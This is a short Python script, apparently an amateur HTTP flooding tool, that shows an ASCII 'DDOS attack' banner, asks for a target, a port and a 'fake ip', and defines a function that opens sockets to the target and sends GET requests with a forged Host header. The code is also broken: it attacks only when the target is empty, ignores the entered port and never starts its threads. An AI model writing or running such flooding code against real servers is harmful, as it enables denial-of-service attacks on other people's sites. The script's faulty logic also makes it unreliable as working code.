import socket 
from colorama import init, Fore
import threading
port = 80
attack_num = 1
print(
"""
You are using the 
000000  000000   000000   000000
0     0 0     0 0      0  0
0     0 0     0 0      0   0
0     0 0     0 0      0      0  -- attack/ 
0     0 0     0 0      0       0
000000  000000   000000   000000
from ilay
"""
)
target = input(">Enter target or URL(example.com):")
potr = input(">Enter port(80):")
fake_ip = input(">Enter Fake ip(0.0.0.0):")
def attack(): 
    if target == "":  
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + "HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        global attack_num 
        attack_num += 1
        print(attack_num)
